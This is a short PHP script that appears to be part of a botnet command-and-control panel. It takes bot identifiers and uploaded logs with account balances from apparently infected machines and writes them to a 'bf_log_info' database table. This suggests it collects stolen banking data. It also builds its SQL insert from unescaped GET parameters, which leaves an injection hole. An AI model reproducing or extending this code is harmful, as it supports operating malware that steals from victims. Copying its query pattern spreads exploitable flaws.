<?php

//error_reporting(0);
ini_set('error_reporting', -1);
header("Pragma: no-cache");
header("Expires: 0");

$dir = str_replace('/scripts/set', '', str_replace('\\', '/', realpath('.'))) . '/';

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';

include_once($dir . 'includes/functions.php');

get_function('first');
get_function('get_config');

get_function('phpservice');

if(empty($_POST['id'])){
    print_data('BOT_ERROR!', true);
}else{
    $matches = explode('0', $_POST['id'], 2);
    if(!empty($matches[0]) && !empty($matches[1])){
        $prefix = $matches[0];
        $uid = '0' . $matches[1];
    }else{
        print_data('BOT_ERROR!', true);
    }
}

$prefix = strtoupper($prefix);
$uid = strtoupper($uid);

$sys = empty($_GET['subsys'])?null:strtolower($_GET['subsys']);
$balance = empty($_GET['balance'])?null:strtolower($_GET['balance']);
$mode = empty($_GET['mode'])?null:$_GET['mode'];
$userid = empty($_GET['cid'])?null:$_GET['cid'];

if(empty($userid)){
    if(file_exists($dir . 'cache/clients.json')){
	$clients = @json_decode(@file_get_contents($dir . 'cache/clients.json'), true);
	if(is_array($clients) && $clients[$prefix]){
			$userid = $clients[$prefix];
		}
	}
}

switch($mode){
    case 'save':
	$cfg_db = get_config();
        require_once($dir . 'classes/mysqli.class.lite.php');
        $mysqli = new mysqli_db();
        $mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
        unset($cfg_db);
        if(count($mysqli->errors) > 0) print_data('DB_ERROR!', true, false);
        
        $mysqli->query('INSERT DELAYED INTO bf_log_info (userid, prefix, uid, balance, log, subsys, system) VALUES (\''.$userid.'\', \''.$prefix.'\', \''.$uid.'\', \''.$balance.'\', \''.$mysqli->real_escape_string($_POST['log']).'\', \''.$sys.'\', \'cc\')');
    break;

    default:
	no_found();
    break;
}

?>